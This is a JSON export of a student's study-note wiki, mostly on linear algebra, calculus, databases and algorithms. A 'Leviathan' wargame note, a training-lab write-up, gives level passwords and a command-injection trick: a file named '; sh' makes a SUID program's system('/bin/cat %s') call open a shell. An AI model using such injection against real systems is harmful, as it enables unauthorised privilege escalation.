Multiplicity","date":"2022-03-20T07:02:33+01:00","description":null,"tags":["math/linear","math/analysis"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"The algebraic multiplicity of an [[/notes/Eigenvalues|eigenvalue]] $\\lambda_0$ is the number of factors $(x - \\lambda_0)$ in the [[/notes/Characteristic Equation|Characteristic Equation]] of the [[/notes/Matrixes|matrix]].\n\nThe geometric multiplicity of the eigenvalue is the [[/notes/Dimension|Dimension]] of the eigenspace $E_{\\lambda_0}$. \n\n> It is always true that $1 \\leq g.m.(\\lambda_0) \\leq a.m.(\\lambda_0)$"},"/notes/Second-Normal-Form":{"title":"2nd Normal Form (2NF)","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"Any 2NF schema must also be 1NF, however, there are some extra requirements for a [[/notes/Relational Model|Relational Model]] to be 2NF. It must not contain any [[/notes/Partial Dependency|Partial Dependency]]s.\n\nIn order to apply [[/notes/Relational Database Normalization|Normalizing a Relational Model]] to a relation that has a [[/notes/Partial Dependency|Partial Dependency]], we apply a [[/notes/Projection|Projection $\\pi$]] over the relation with two sets of attributes, one of which being the attributes that *define* the dependency and the attributes that depend on the dependency, and the other one being the original relation with the dependants of the dependency removed.","tags":null,"aliases":null,"description":null},"/notes/Primary-Key-Constraints":{"title":"Primary Key Constraints","date":"2021-12-14T20:32:21+01:00","tags":["cs/databases","cs/theory"],"lastmodified":"2022-06-19T20:46:41.318597","content":"Since a relation is defined as a set of tuples, and a primary key has to be unique accross all database entries, we can define a primary key as a **set of attributes** in which no two tuples share the same values for those attributes. It is important to know that any relation *MUST* have a key.","aliases":null,"description":null},"/notes/Polar-Coordinates":{"title":"Polar Coordinates","date":"2022-03-06T09:06:59+01:00","description":null,"tags":["math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Polar forms are a special way of representing points in the 2d plane. Any point in the 2D plane is defined by its **rotation** and the distance from origin in that rotation.\n\n![[images/Pasted image 20220306210817.png]]\n\nThe polar form of $z$ is $r(cos(\\theta)+isin(\\theta))$"},"/notes/Quick-Sort":{"title":"Quick Sort","date":"2021-12-23T12:52:48+03:00","description":null,"tags":["cs/algorithms","cs/sorting"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Quick sort is an algorithm that splits the array into three parts according to a **pivot** value, `L, E, G`, array with the elements that are less then, equal to, or greater than the pivot respectively. This approach is very depenedent on [[/notes/Quick Sort Pivot Selection|how good the pivot is chosen]] and the complexity of the algorithm is volatile because of that."},"/notes/Power-Series":{"title":"Power Series","date":"2022-01-18T10:23:44+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Power series are a special kind of [[/notes/Series|Series]] that can be written in the form:\n\n$$\n\\sum_{n=0}^\\infty = c_n(x-a)^n = c_0 + c_1(x-a) + c_2(x-a)^2 ...\n$$\n\nThe example is called a power series in $(x-a)$\n\nThe special part of power series is that the [[/notes/Convergent Series|convergence]] of the series depends on the value of $x$.  To determine for which values of $x$ the series converges, we simply apply a [[/notes/Ratio Test|Ratio Test]] to the series and calculate $x$ for\n\n$$\n\\frac{|x-a|}{R} < 1\n$$\n\nIn this case, $a$ is the series' center of convergence while $R$ is its radius of convergence. \n\n![[images/Pasted image 20220118222816.png]]\n\n> In power series, after solving for $x$ we get a range for $x$. Even though the series converges in this range, we need to check manually if the series also converges at the ends of those ranges."},"/notes/Inverse-Matrix":{"title":"Inverse Matrix","date":"2022-02-26T07:24:28+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Inverse [[/notes/Matrixes|Matrixes]] are basically [[/notes/Linear Transformations|Linear Transformations]] that can reverse the effects of a matrix. Finding the inverse of a matrix is done through this method:\n\n1. An augmented matrix of type $\\begin{bmatrix} A & | & I_n \\end{bmatrix}$, where $I_n$ is an [[/notes/Special Matrices#^81da11|identity matrix]] of size $n \\times n$.\n2. If $A$ is invertible, than you can use [[/notes/Elementary Row Operations|Elementary Row Operations]] in order to reduce the augmented matrix so that it is in the form $\\begin{bmatrix} I_n & | & A^{-1} \\end{bmatrix}$"},"/notes/Dequeue":{"title":"Dequeue","date":"2021-11-23T09:00:33+01:00","tags":["cs/data-structures","cs/lists"],"lastmodified":"2022-06-19T20:46:41.318597","content":"This is basically a [[/notes/Queue|Queue]] data structure, except the user has access to both the head and the tail.","aliases":null,"description":null},"/notes/Run-Command-in-Empty-Environment":{"title":"Run Command in Empty Environment","date":"2022-01-31T05:29:10+01:00","description":null,"tags":["cs/linux","cs/tips"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Running `env -i {command}` clears out the enironment variables and runs your command in it."},"/notes/Up-Heap-Bubbling":{"title":"Heap Bubbling","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.322597","content":"After inserting an element to a [[/notes/Heap|Heap]], sometimes, the heap's **heap-order property** might be broken. In order to fix this, we apply bubbling to that newly inserted element. This operation has three steps:\n1. Compare the value of the element with parent's if parent's value is greater (for min-heaps), switch those two nodes.\n2. Repeat step 1 until the heap-order proprty is not broken.","tags":null,"aliases":null,"description":null},"/notes/String-Concatanation-in-Java":{"title":"String Concatantion in Java","date":"2021-11-16T21:07:41+01:00","lastmodified":"2022-06-19T20:46:41.322597","content":">  ...strings in Java are immutable objects. Once created, an instance cannot be modified. The command, answer += c, is shorthand for answer = (answer + c). This command does not cause a new character to be added to the existing String instance; instead it produces a new String with the desired sequence of characters, and then it reassigns the variable, answer, to refer to that new string.\n>  In terms of efficiency, the problem with this interpretation is that the creation of a new string as a result of a concatenation, requires time that is proportional to the length of the resulting string...\n>  \n>  (Data Structures and Algorithms, Michael Goodrich (Page 172))\n\nSo, this means that any operation involving string concatanation run in O(n) time (see [[/notes/Big-Oh Notation|Big-Oh Notation]]), n being the length of the string.","tags":null,"aliases":null,"description":null},"/notes/In-Place-Quick-Sort":{"title":"In-Place Quick Sort","date":"2021-12-25T02:40:50+01:00","description":null,"tags":["cs/sorting","cs/algorithms","cs/java"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Implementing [[/notes/Quick Sort|Quick Sort]] in place allows us to decrease the space-complexity of the algorithm and make it slightly more efficient. Here is an in-place implementation of quick sort in java:\n\n```java\npublic static <K> void quickSortInPlace(K[] S, Comparator<K> comp, int a, int b) {\n    if (a >= b) {\n        return;\n    }\n\n    int left = a;\n    int right = b - 1;\n\n    K pivot = S[b];\n    K temp;                     // temp object used for swapping\n\n    while (left <= right) {\n        // scan until reaching value equal or larger than pivot (or right marker)\n        while (left <= right && comp.compare(S[left], pivot) < 0) {\n            left++;\n        }\n\n        // scan until reaching value equal or smaller than pivot (or left marker)\n        while (left <= right && comp.compare(S[right], pivot) > 0) {\n            right--;\n        }\n\n        if (left <= right) {        // indices did not strictly cross\n            // so swap values and shrink range\n            temp = S[left];\n            S[left] = S[right];\n            S[right] = temp;\n            left++;\n            right--;\n        }\n    }\n\n    // put pivot into its final place (currently marked by left index)\n    temp = S[left];\n    S[left] = S[b];\n    S[b] = temp;\n    \n    quickSortInPlace(S, comp, a, left - 1);\n    quickSortInPlace(S, comp, left + 1, b);\n}\n```"},"/notes/Sets":{"title":"Sets","date":"2021-12-31T03:08:51+03:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Sets are data-structures similat to [[/notes/Maps|Maps]], except that there is no key-value relationship. The difference of sets from [[/notes/Array|Array]]s is that sets do not have indexes, and can only have one copy of a certain entry."},"/notes/krypton2":{"title":"krypton2","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/cryptography"],"lastmodified":"2022-06-19T20:46:41.322597","content":"create a file that contains all the letters in the alphabet, and run the encrypt binary on the file. Now you have a one-to-one map of all the letters and their correspondants. Using this info you can easily decode the string:\n\n    abcdefghijklmnopqrstuvwxyz\n    MNOPQRSTUVWXYZABCDEFGHIJKL\n\n    OMQEMDUEQMEK\n    caeseriseasy (CAESARISEASY)","aliases":null,"description":null},"/notes/The-Squeeze-Theorem-Limits":{"title":"The Squeeze Theorem","date":"2021-11-24T18:41:59+01:00","tags":["cs/calculus"],"lastmodified":"2022-06-19T20:46:41.322597","content":"When you take three funtions $f(x)$, $g(x)$ and $h(x)$ such that $f(x) \\le g(x) \\le h(x)$, but you can't calculate the limit of the function $g(x)$ at a value\n$c$, you can simply calculate $\\lim_{x\\to c} f(x)$ and $\\lim_{x\\to c} h(x)$.\nThe value of $\\lim_{x\\to c} g(x)$ must be between those values and if they are\nequal, then it must equal to that value as well. This method is particularly\nuseful when dealing with the limits of periodical functions such as\n[[/notes/Trigonometric Functions|Trigonometric Functions]], for instance, when calculating $\\lim_{x\\to 1}$ for\n$g(x) = x^2sin(\\frac{\\pi}{x})$ . Since the range of the sine function is $-1\n\\le sin(x) \\le 1$, we can take $f(x) = -x^2$ and $g(x) = x^2$. Now, calculating\nthe limit of both these we functions as x approaches 0, we find that they both\nequal 0, therefore the answer is 0.","aliases":null,"description":null},"/notes/Graphs":{"title":"Graphs","date":"2022-01-23T09:19:27+01:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Graphs are data-structures made up of nodes/vertices and edges. In a graph, vertices are connected to each other using edges. So, graphs can be represented using two sets, a set of edges and a set of vertices. If the graph is undirected, each edge should be a set as well. If it is directed however, edges must be represented as tuples."},"/notes/Stack":{"title":"Stack","date":"2021-11-23T09:00:33+01:00","tags":["cs/data-structures"],"lastmodified":"2022-06-19T20:46:41.322597","content":"A stack is a data structure that is organized like a *stack* of plates organized one top of each other. You only have access to the plate on top, you can `peek` at it, `pop` it off the stack or `push` a new plate on the stack. The stack you put on the stack last is the plate you take out first. A stack has three basic operations:\n\n* `peek`: Get the first item on top of the stack without removing it. $O(1)$\n* `pop`: Get the first item on top of the stack and remove it. $O(1)$\n* `push`: Put a new item on top of the stack. $O(1)$","aliases":null,"description":null},"/notes/Convergence-Testing-Of-Series":{"title":"Convergence Testing Of Series","date":"2022-01-17T05:53:02+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"There are several methods that can be used in order to test whether a series is convergent.\n1. [[/notes/Divergence Test|Divergence Test]] The least useful of them all\n2. [[/notes/Alternating Series Test|Alternating Series Test]] A test to check whether alternating series converge\n3. [[/notes/Comparison Test|Comparison Test]] A test similar to the squeeze theorem in limits\n4. [[/notes/Limit Comparison Test|Limit Comparison Test]] Similar to the comparison test, except it involves limits\n5. [[/notes/Ratio Test|Ratio Test]] A test which eventually leads us to power series"},"/notes/Candidate-Key":{"title":"Candidate Key","date":"2021-12-14T20:32:21+01:00","tags":["cs/databases","cs/theory"],"lastmodified":"2022-06-19T20:46:41.314596","content":"A candidate key is a set of attributes or multiple attributes, which can be used to identify a tuple in a database. The way you can find the candidate keys in a schema is using the definition:\n> A [[/notes/Super Key|Super Keys]] is also a candidate key if no subset of that superkey is a superkey in its own.","aliases":null,"description":null},"/notes/ER-Diagrams-Weak-Entity-and-Identifying-Relationship":{"title":"Weak Entity and Identifying Relationship in ER Diagrams","date":"2021-11-23T14:10:26+01:00","tags":["cs/databases","cs/diagrams"],"lastmodified":"2022-06-19T20:46:41.318597","content":"A [[/notes/Weak Entity|Weak Entity]] in [[/notes/ER Diagrams|ER Diagrams]] is an entity type that depends on another entity for its existence and cannot exist without it. En example of a weak entity is a Student and a University, in this example, the Student is a weak entity. Since a student can't exist without a university. Another thing to consider is that the student's number is only identifying inside that university, so, we need a way to specify that inside our diagram. For this, we use an [[/notes/Weak Entity|Weak Entity]]. Also, since a weak entity, cannot exist without the class it is identified by, every instance of that entity must relate to at least one of those entities. Again, for this, we use [[/notes/ER Diagram Total Participation|total participation]].\n\n![[images/20211123111244.png]]","aliases":null,"description":null},"/notes/Divergence-Test":{"title":"Divergence Test","date":"2022-01-17T06:20:13+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The divergence test is pretty much the least useless one. All it does is that it checks if a [[/notes/Series|Series]] is not [[/notes/Convergent Series|convergent]]. The idea is that a series\n\n$$\nS = \\sum_{n=0}^\\infty a_n\n$$\n\nconverges if $\\lim_{n\\to\\infty} a_n = 0$. However, since this is not an if and only if statement, all it says that is if $\\lim_{n\\to\\infty} a_n \\neq 0$, then the series is divergent."},"/notes/Checking-if-a-graph-is-a-DAG":{"title":"Checking if a graph is a DAG","date":"2022-01-24T03:34:06+01:00","description":null,"tags":["cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"Checking whether a [[/notes/Graphs|graph]] is a [[/notes/Directed Acyclic Graphs|Directed Acyclic Graphs]] is a trivial problem. First off, we need to know that for a graph to be a DAG, there must exit at least one vertice with $0$ incoming edges, otherwise, it cannot be a DAG(go figure out why yourself, you nitwit). After accepting the proposition, it is easy to find the topological ordering of the graph using the following algorithm:\n\n```\npick a vertice with 0 incoming edges\nif none exists:\n\tnot a DAG\nappend the vertice to the topological order of the graph\nremove the vertice from the graph\nrepeat until graph is empty\n```"},"/notes/Vertice-Terminology":{"title":"Vertice Terminology","date":"2022-01-23T09:26:37+01:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.322597","content":"A [[/notes/Graphs|graph]] is made up of edges and vertices.\n\n* **End Vertices:** The vertices that are connected by an edge.\n* **Origin:** First endpoint of vertice.\n* **Endpoint:** Last endpoint of vertice.\n* **Incident:** Two vertices are connected by an edge. ^39dda4\n* **Adjacent:** The edge has an endpoint at the vertice.\n* **Degree:** How many edges have endpoints at the vertice.\n* **Parallel Edges:** Two edges with the same origin and endpoint.\n* **Self loop:** When the two endpoint of an edge are the same. ^2fdf69"},"/notes/Graph-Terminology":{"title":"Graph Terminology","date":"2022-01-23T09:34:06+01:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"* **Simple [[/notes/Graphs|Graph]]:** A graph with no [[/notes/Vertice Terminology#^2fdf69|self loops]]\n* **Simple path:** A path in which no vertex is visited more than once.\n* **Connected Graph:** In a graph, any two vertices have a path between them. If the graph is directional, it is called **strongly connected**. ^42fbff\n* **Spanning Subgraph:** A subgraph that contains all the vertices of the main graph.\n* **Connected Components:** The maximal/largest connected subgraphs that a graph has. ^f18c89\n* **Forest:** A graph without cycles. ^d6fb26\n* **Tree:** A connected forest. ^78100b\n* **Spanning Tree:** A spanning subgraph which is also a tree."},"/notes/Super-Key":{"title":"Super Keys","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.322597","content":"A super key is a set of attributes which can be used to identify a tuple in a table.","tags":null,"aliases":null,"description":null},"/notes/Bottom-Up-Heap-Construction":{"title":"Bottom-Up Heap Construction","date":"2021-12-21T02:25:16+01:00","description":null,"tags":["cs/algorithms","cs/trees"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"Constructing a heap from scratch by inserting each element into the heap takes $O(nlog(n))$ time. However, when you have a list with $2^n-1$ elements, you can construct a heap with those elements in $O(n)$ time using the following steps.\n\n> The diagrams are for the list `[1,9,10,8,7,2,5,6,3,11,13,4,12,15,16]`\n\n1. Construct $\\frac{n+1}{2}$ heaps each with one element \n```mermaid\ngraph TD\n\tA((6)) & B((3)) & C((11)) & D((13)) & E((4)) & F((12)) & G((15)) & H((16))\n```\n\n2. Construct $\\frac{n+1}{4}$ heaps each with three elements\n```mermaid\ngraph TD\n\tI((8)) --- A((6)) & B((3))\n\tJ((7)) --- C((11)) & D((13))\n\tK((2)) --- E((4)) & F((12))\n\tL((5)) --- G((15)) & H((16))\n```\n\n3. Apply [[/notes/Down Heap Bubbling|Down-Heap Bubbling]] on each heap.\n\n```mermaid\ngraph TD\n\tI((8)) --- A((6)) & B((3))\n\tJ((13)) --- C((11)) & D((7))\n\tK((12)) --- E((4)) & F((2))\n\tL((16)) --- G((15)) & H((5))\n```\n2. Construct $\\frac{n+1}{8}$ heaps each with seven elements\n```mermaid\ngraph TD\n\tM((9)) --- I & J\n\tN((10)) --- K & L\n\tI((8)) --- A((6)) & B((3))\n\tJ((13)) --- C((11)) & D((7))\n\tK((12)) --- E((4)) & F((2))\n\tL((16)) --- G((15)) & H((5))\n```\n\n3. Apply [[/notes/Down Heap Bubbling|Down-Heap Bubbling]] on each heap.\n\n```mermaid\ngraph TD\n\tM((13)) --- I & J\n\tN((16)) --- K & L\n\tI((8)) --- A((6)) & B((3))\n\tJ((11)) --- C((9)) & D((7))\n\tK((12)) --- E((4)) & F((2))\n\tL((15)) --- G((10)) & H((5))\n```\n4. Finally, add the last element in the list and apply [[/notes/Down Heap Bubbling|Down-Heap Bubbling]] one final time.\n```mermaid\ngraph TD\n\tO((16)) --- M & N\n\tM((13)) --- I & J\n\tN((15)) --- K & L\n\tI((8)) --- A((6)) & B((3))\n\tJ((11)) --- C((9)) & D((7))\n\tK((12)) --- E((4)) & F((2))\n\tL((10)) --- G((1)) & H((5))\n```"},"/notes/Matrix-Transformation":{"title":"Matrix Transformation","date":"2022-02-26T12:14:25+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Matrix transformations are equations of the form:\n\n$$\nT(x) = Ax\n$$\n\nWhere $A$ is a matrix. The domain of the transformation is the size of the vector that is inputted into the transformation, while the codomain is the size of the vector that transformation outputs:\n\nIn the case of a matrice like:\n\n$$\n\\begin{bmatrix}\n1 & 4 & 3 \\\\\n2 & 7 & 1 \n\\end{bmatrix}\n$$\n\nThe domain is its length, while the codomain is its height. (Due to the properties of [[/notes/Matrix-Vector Product|Matrix-Vector Product]]). While its range is the [[/notes/Vector Span|Vector Span]] of its column."},"/notes/Matrix-Multiplication":{"title":"Matrix Multiplication","date":"2022-02-26T03:43:30+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"For a [[/notes/Matrixes|matrix]] multiplication to be valid, you need two vectors $A$ and $B$ such that $A$ is of size $m \\times n$ and $B$ of size $n \\times p$ and the multiplication must occur in the order $AB$, and results in a matrix of size $m \\times p$. In order to apply the multiplication you use the formula below:\n\n$$\nAB = \\begin{bmatrix}\nAb_1 & Ab_2 & Ab_3 & ... & Ab_p\n\\end{bmatrix}\n\n$$\n\n> Matrix multiplication is equivalent to applying two [[/notes/Linear Transformations|Linear Transformations]] one after another, this is why the order of multiplication matters"},"/notes/Foreign-Key-Constraints":{"title":"Foreign Key Constraints","date":"2021-12-14T20:32:21+01:00","tags":["cs/databases"],"lastmodified":"2022-06-19T20:46:41.318597","content":"Sometimes, a relation between [[/notes/Entity|Entity]]s might need to me make a reference to another relation. In those cases, we use the following notation:\nHero(<ins>id</ins>, first_name, last_name)\nAliases(<ins>alias</ins>, heroid -> Hero(id))\nin order to protect the **referential integrity** of the database, we set the constraint that a referencing attribute must be the key of a tuple that is in the database.\nWhen you have a composite key, the notation becomes:\nHero(<ins>id</ins>, <ins>first_name</ins>, last_name)\nAliases(<ins>alias</ins>, (hero_id, hero_name) -> Hero(id,first_name))","aliases":null,"description":null},"/notes/Breadth-First-Traversal":{"title":"Breadth First Traversal","date":"2021-12-14T20:32:21+01:00","tags":["cs/algorithms","cs/trees"],"lastmodified":"2022-06-19T20:46:41.314596","content":"In breadth first [[/notes/Tree Traversal|Tree Traversal]], the nodes at the same depth([[/notes/Tree Terminology|Important Tree Terminology]]) are visited first, before visiting the nodes at higher depths. A queue is commonly used in order to achieve this.","aliases":null,"description":null},"/notes/Matrix-Transpose":{"title":"Matrix Transpose","date":"2022-02-26T04:35:40+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The transpose of a [[/notes/Matrixes|matrix]] is basically the matrix but turned around. The transpose of a matrix $n \\times m$ is equal to a matrix of size $m \\times n$, in which, rows become columns. A transpose is represented by $A^T$.\n\n> An important property of transpose regarding [[/notes/Matrix Multiplication|Matrix Multiplication]], is that $(AB)^T = B^TA^T$"},"/notes/Red-Black-Trees":{"title":"Red-Black Trees","date":"2022-01-04T01:37:37+03:00","description":null,"tags":["cs/data-structures","cs/trees"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Red-Black trees are a type of [[/notes/Binary Search Trees|Binary Search Trees]] which aim to keep the tree balanced by adding an extra property into each node, whether it is red or black and enforcing a set of properties:\n\n- **Root Property:**  The root of red-black tree is black\n- **External Property:** Every external node is black\n- **Red Property:** The children of a red node are black\n- **Depth Property:** The black depth(i.e. The number of proper ancestors that are black) of each external node is the same."},"/notes/Horizontal-Asymptote":{"title":"Horizontal Asymptote","date":"2021-11-25T01:27:30+01:00","tags":["math/analysis","math/calculus"],"lastmodified":"2022-06-19T20:46:41.318597","content":"Horizontal asymptotes occur when a function approaches to a certain value as x goes to infinity. So, there can be 2 different horizontal asymptotes at max. One for $\\infty$ and one for $-\\infty$. In order to calculate a horizontal asymptote for $f(x)$, you need to calculate $\\lim_{x\\to \\infty}f(x)$ and $\\lim_{x\\to -\\infty}f(x)$.","aliases":null,"description":null},"/notes/Projection":{"title":"Projection $\\pi$","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"When normalizing a database that has a redundancy problem, it is often a good idea to split up a single table into multiple tables. In order to this we use the technique called projection. When projecting a database, we *decompose* a relation into multiple relations. If you let $\\alpha_1, \\alpha_2,..., \\alpha_n \\subseteq \\{A_1, ..., A_3\\}$ be n subsets of a relation $R$'s attributes, we can define a new $R_i$ for any $\\alpha_i$ such that:\n\n$$R_i = \\pi_{\\alpha_i}R$$\n\nIn this case, $\\alpha_1, \\alpha_2,..., \\alpha_n$ is a decomposition of the relation R. For this decomposition to be good, it needs to be lossless, meaning that the joining of all those projections ($R_1 \\bowtie R_2 ... \\bowtie R_n$) must be equal to R.","tags":null,"aliases":null,"description":null},"/notes/Binary-Tree-Rotations":{"title":"Binary Tree Rotations","date":"2022-01-01T03:14:57+01:00","description":null,"tags":["cs/data-structures","cs/algorithms","cs/trees"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"A rotation of a [[/notes/Binary Tree|Binary Tree]] node is basically replacing a node with one of its children. In order to sustain the search tree property of a binary tree however, when replacing a node with its left child, the host becomes its right child, and the reverse applies when replacing wit its right child. One or more rotate operations can be applied consecutively to esentially restructure a tree."},"/notes/Leviathan":{"title":"Leviathan","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/pwn","cs/reverse"],"lastmodified":"2022-06-19T20:46:41.318597","content":"-   leviathan0: `grep leviathan ~/.backup/bookmarks.html` (rioGegei8m)\n\n## leviathan1\n\nThe home dir has a single SUID binary **check**, owned by *leviathan2*\n\n    -r-sr-x--- 1 leviathan2 leviathan1 7.3K Aug 26  2019 check\n\nWe can use radare or IDA to get an idea of what the binary does:\n\n``` {.asm6502 .numberLines startFrom=\"\"}\nmov dword [s2], 0x786573    ; 'sex'\nmov dword [var_17h], 0x72636573 ; 'secr'\nmov word [var_13h], 0x7465  ; 'et'\nmov byte [var_11h], 0\nmov dword [var_1bh], 0x646f67 ; 'god'\nmov dword [var_20h], 0x65766f6c ; 'love'\nmov byte [var_1ch], 0\nsub esp, 0xc\npush str.password:_         ; 0x8048690 ; \"password: \" ; const char *format\ncall sym.imp.printf         ; int printf(const char *format)\nadd esp, 0x10\ncall sym.imp.getchar        ; int getchar(void)\nmov byte [s1], al\ncall sym.imp.getchar        ; int getchar(void)\nmov byte [var_bh], al\ncall sym.imp.getchar        ; int getchar(void)\nmov byte [var_ah], al\nmov byte [var_9h], 0\nsub esp, 8\nlea eax, [s2]\npush eax                    ; const char *s2\nlea eax, [s1]\npush eax                    ; const char *s1\ncall sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)\nadd esp, 0x10\ntest eax, eax\njne 0x80485e5\n```\n\nOk, so there are multiple strings defined, \\'sex\\', \\'secr\\', \\'et\\', \\'god\\', \\'love\\'. The binary than prints the password prompt and saves the user\\'s input into `[s1]` as can be seen on the instruction `mov byte [s1] al`. It then pushes `s1` and `s2` on the stack and calls `strcmp` on those two strings. If they match (aka. `text eax, eax` sets the zero flag) than a shell is spawned. And between all the strings in the start, the one pushed to `[s2]` s2 is `sex`, nice. (ougahZi8Ta)\n\n## leviathan2\n\n```assembly\n.text\nmain:\nadd esp, 0x10\ntest eax, eax\nje 0x80485a8\nsub esp, 0xc\npush str.You_cant_have_that_file... ; 0x80486b9 ; \"You cant have that file...\" ; const char *s\ncall sym.imp.puts           ; int puts(const char *s)\nadd esp, 0x10\nmov eax, 1\njmp 0x80485fa\nmov eax, dword [ebx + 4]\nadd eax, 4\nmov eax, dword [eax]\npush eax\npush str.bin_cat__s         ; 0x80486d4 ; \"/bin/cat %s\" ; const char *format\npush 0x1ff                  ; 511 ; size_t size\nlea eax, [string]\npop ebx\npop ebp\nlea esp, [ecx - 4]\nret\n```\n\nThe program asks the user for the input of a filename and then runs `/bin/cat %s` using the `system` function call. We can inject any command we want by separating the filename with *;* . We can simply create a file with the name \\'; sh\\' and run `printfile`. Bada Bing Bada Boom, we have a shell.(Ahdiemoo1j)\n\n## leviathan3","aliases":null,"description":null},"/notes/Functional-Dependency":{"title":"Functional Dependencies","date":"2021-12-14T20:32:21+01:00","tags":["cs/databases"],"lastmodified":"2022-06-19T20:46:41.318597","content":"If you have two sets of attributes, call them $X$ and $Y$, id $Y$ functionally depends on $X$, then two tuples which agree on their $X$ values must also agree on their $Y$ values. A functional dependency(denoted using  $X\\to Y$) in subsets $X,Y\\subseteq{A_1,...,A_n}$  means that for two arbitrary tuples $t_1$ and $t_2$:\n$$\\pi_Xt_1 = \\pi_Xt_2 \\iff \\pi_Yt_1 = \\pi_Yt_2$$\n> If you don't understand the notation, review [[/notes/Projection|Projection $\\pi$]]\n> In plain english, this means that if the tuples have the same values for the attributes in X, they must also have the same values for Y.\n\n> X->Y means that: \n> X *functionally determines* Y\n> Y *functionally depends on* X\n> X is the determinant and Y is the dependant in this relationship\n\nSince functional dependencies are semantic(i.e. they depend on the real world knowledge), they are determined by the engineer of the schema and are manualy defined [[/notes/Integrity Constraints|Integrity Constraits]].\n\n> When you have the functional dependency X->Y in the relation R, X is a [[/notes/Super Key|Super Keys]] in R.","aliases":null,"description":null},"/notes/Diagonalization":{"title":"Diagonalization","date":"2022-03-20T08:26:44+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Diagonalization is a more specific form of [[/notes/Similar Matrices|Similar Matrices]], basically, diagonalization is the process of finding a [[/notes/Matrixes|matrix]] $D$ that is similar to $A$ and is a diagonal matrix. As well as finding the matrix $P$. This makes it easier to calculate the $k^{th}$ time the matrix $A$ is applied to a vector $v$.\n\nIn diagonalization, the matrices $P$ and $D$ are calculated using the [[/notes/Eigenvalues|Eigenvalues]]($\\lambda_n$) and their coressponding [[/notes/Eigenvectors|Eigenvectors]]($w_n$). \n\n$$\nD = \\begin{bmatrix}\n\\lambda_{0} & 0 & 0 & 0 & ... \\\\\n0 & \\lambda_{1} & 0 & 0 & ... \\\\\n0 & 0 & \\lambda_{2} & 0 & ... \\\\\n0 & 0 & 0 & \\lambda_{3} & ... \\\\\n\\end{bmatrix} \n$$\n\n$$\nP = \\begin{bmatrix}\nw_0 & w_{2} & w_{3} & w_{4} & ...\\\\\n\\end{bmatrix}\n$$\n\nSince one of the conditions for diagonability is that there are $n$ [[/notes/Linear Indepence and Dependence|linearly independent]] eigenvectors, $P$ **must** be invertible."},"/notes/Echeleon-Forms":{"title":"Echeleon Forms","date":"2022-02-22T04:03:44+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Echeleon forms are special matrices such that they are in the form:\n\n$$\n\\begin{bmatrix}\n0 & P & * & * & * \\\\\n0 & 0 & P & * & * \\\\\n0 & 0 & 0 & 0 & P \\\\\n0 & 0 & 0 & 0 & 0\n\\end{bmatrix}\n$$\n\nIn this matrice, $P$'s are called pivot points, meaning that they can be any value besides 0. While $*$'s can be any value."},"/notes/Power-Series-As-Functions":{"title":"Power Series As Functions","date":"2022-01-19T09:06:32+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Since power series are defined relevant to a value $x$. We can define some properties for two series $f(x) = \\sum a_nx^n$ for $|x|<R_1$ and $g(x) = \\sum b_nx^n$ for $|x|< R_2$:\n\n* $cx^k\\sum f(x) = \\sum ca_n x^{n+k}$ $|x| < R_1$\n* $f(cx^k) = \\sum a_n c^n x^{nk}$ $|cx^k| < R_1$\n* $f(x - c) = \\sum a_n (x-c)^n$ $|x-c| < R_1$\n* $f(x) + g(x) = \\sum (a_n+b_n)x^n$ $|x| < min(R_1, R_2)$\n\nIt is also possible to differentiate power series \n$$\nf(x) = \\sum c_n(x-a)^n = c_0 + c_1(x-a) + c_2(x-a)^2 ...\n$$\n\n$$\nf'(x) = c_1 + 2c_2(x-a) + 3c_3(x-a)^2 = \\sum nc_n(x-a)^{n-1}\n$$\n\n$$\n\\int f(x)dx = c + c_0(x-a) + \\frac{c_1(x-a)^2}{2} = \\sum \\frac{c_n(x-a)^{n+1}}{n+1}\n$$\n\n> The radius of convergence remains the same for both integration and differentiation"},"/notes/Matrixes":{"title":"Matrixes","date":"2022-02-26T03:21:37+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Matrixes are basically multiple 